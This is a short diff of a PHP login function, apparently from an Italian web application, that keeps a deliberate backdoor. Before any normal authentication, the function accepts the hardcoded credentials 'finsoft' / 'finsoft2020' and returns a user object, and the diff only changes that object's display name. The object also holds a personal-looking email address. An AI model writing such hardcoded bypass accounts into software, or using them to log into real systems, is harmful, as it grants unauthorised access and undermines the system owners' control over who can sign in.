@@ -42,9 +42,9 @@ function check_and_load_user($username, $pwd) {
     // PRIMA, proviamo la backdoor
     if ($username == 'finsoft' && $pwd == 'finsoft2020') {
         $user = (object) [];
-        $user->nome_utente = 'Finsoft_User';
-        $user->nome = 'User';
-        $user->cognome = 'Finsoft';
+        $user->nome_utente = 'finsoft';
+        $user->nome = 'Mario';
+        $user->cognome = 'Rossi';
         $user->email = 'alessandro.barsanti@it-present.com';
         return $user;
     }
